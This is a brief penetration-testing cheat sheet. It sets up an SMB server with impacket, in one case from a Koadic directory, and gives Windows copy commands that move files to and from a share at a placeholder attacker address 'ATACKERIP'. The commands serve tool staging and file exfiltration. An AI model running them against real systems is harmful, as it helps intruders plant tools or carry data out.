##### SMB Server 1
`impacket-smbserver -smb2support -user username -password password sharename $(pwd)`

##### SMB Server 2
`sudo python2 /usr/share/koadic/data/impacket/examples/smbserver.py tools .`
_after this on windows_
`copy \\ATACKERIP\tools\filename.exe .`
_or_
`copy filename.txt \\ATACKERIP\tools\filename.txt`